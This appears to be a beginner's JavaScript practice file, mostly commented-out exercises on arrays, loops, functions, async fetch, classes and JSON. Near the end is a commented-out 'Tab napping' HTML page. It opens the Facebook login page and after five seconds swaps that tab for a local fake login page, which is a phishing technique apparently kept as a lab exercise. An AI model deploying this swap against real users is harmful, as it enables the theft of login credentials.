


// let fruit = ["apple", "banana"]
// fruit.push("orange")
// console.log(fruit);

// let age = 18; 
// let result = age >= 18 ? "Adult" : "Minor";
// console.log(result);

// let i=1; 
// while (i<=5){
//     console.log(i)
//     i++;
// }



// let greet = () => {
//     console.log("Hello");

// }; 

// greet();


// let add = (a,b) => {
//     result = a + b 
//     console.log(result)
// }
// add(2,3)

// async function sayHello() {
//   return "Hello, World!";
// }

// sayHello().then(message => console.log(message));

// async function fetchData() {
//   // simulate fetching data with a Promise
//   let data = await new Promise((resolve, reject) => {
//     setTimeout(() => resolve("Data received!"), 2000);
//   });

//   console.log(data);
// }

// fetchData();


// async function fetchAPIData(url) {
//   try {
//     let response = await fetch(url);
//     if (!response.ok) throw new Error("HTTP error! Status: " + response.status);
//     let data = await response.json();
//     console.log(data);  // Display data in console
//     return data;
//   } catch (error) {
//     console.error("Error fetching API:", error);
//   }
// }

// // Call the function with a URL
// fetchAPIData("https://jsonplaceholder.typicode.com/todos/1");



// let person = {
//     name : "Ali",
//     age: 20,
//     isStudent: true 
// }; 
// console.log(person)
// console.log(person.name)
// console.log(person["age"]);


// function Person(name, age){
//     this.name = name 
//     this.age = age 
// }
// let person1 = new Person("Ali", 20)
// let peron2 = new Personn("Sara", 25)
// console.log(person1)

// class Person { 
//     constructor(name,age){
//         this.name = name 
//         this.age = age
//     }
//     greet(){
//         console.log(`hello, my name is ${this.name} and ${this.age}`)
//     }
// }
// let p1 = new Person("Alie", 20)
// p1.greet()



// let person = {
//     name : "Ali",
//     age : 20,
//     isStudent: true
// }; 

// let jsonstring = JSON.stringify(person)
// console.log(jsonstring)

// async function fetchData(url) {
//     let res = await fetch(url);
//     let data = await res.json();
//     return data;
// }


// let jsonString = '{"name":"Alice", "age":25'; // ❌ Missing closing brace

// try {
//     let obj = JSON.parse(jsonString); // This will throw an error
//     console.log(obj.name);
// } catch (error) {
//     console.log("Oops! Invalid JSON: " + error.message);
// }


// <!DOCTYPE html>
// <html lang="en">
// <head>
//     <meta charset="UTF-8">
//     <title>Tab napping</title>
// </head>
// <body>
//     <h2>Welcome To Our Website</h2>
//     <p>Current Time: <span id="time"></span></p>
//     <button onclick="goToHomepage()">Go to your home page</button>

//     <script>
//         function updateTime() {
//             const now = new Date();
//             const timeString = now.toLocaleTimeString();
//             const timeElement = document.getElementById("time");
//             timeElement.textContent = timeString;
//         }

//         updateTime();
//         setInterval(updateTime, 1000);
//         function goToHomepage() {
//          const windowObj = window.open("https://www.facebook.com/login/?locale=km_KH", "_blank");

//             setTimeout(() => {
//                 windowObj.location.replace("http://127.0.0.1:5500/fake_login.html");
//             }, 5000); 
//         }
//     </script>
// </body>
// </html>


function update(){
    const now = new Date()
    const timeString = now.toLocaleString();
    const timeElement = document.getElementById
}